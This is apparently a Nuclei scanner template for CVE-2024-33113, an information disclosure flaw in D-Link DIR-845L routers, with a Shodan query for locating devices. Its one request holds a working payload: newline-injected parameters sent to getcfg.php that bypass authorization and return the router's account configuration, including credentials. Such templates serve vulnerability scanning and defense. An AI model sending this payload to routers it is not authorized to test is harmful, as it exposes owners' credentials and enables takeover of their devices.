id: CVE-2024-33113

info:
  name: D-LINK DIR-845L bsc_sms_inbox.php file - Information Disclosure
  author: pussycat0x
  severity: medium
  description: |
    CVE-2024-33113 is a vulnerability in the D-LINK DIR-845L router that allows information disclosure through the bsc_sms_inbox.php file. The vulnerability arises from improper handling of the include() function, which can be exploited by manipulating the $file variable. This allows attackers to include arbitrary PHP scripts and potentially retrieve sensitive information such as the router's username and password.
  reference:
    - https://github.com/FaLLenSKiLL1/CVE-2024-33113
  metadata:
    max-request: 1
    verified: true
    shodan-query: DIR-845L
  tags: cve,cve2024,dlink

http:
  - method: GET
    path:
      - "{{BaseURL}}/getcfg.php?a=%0A_POST_SERVICES=DEVICE.ACCOUNT%0AAUTHORIZED_GROUP=1"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<service>DEVICE.ACCOUNT</service>"
          - "<seqno>"
        condition: and

      - type: status
        status:
          - 200
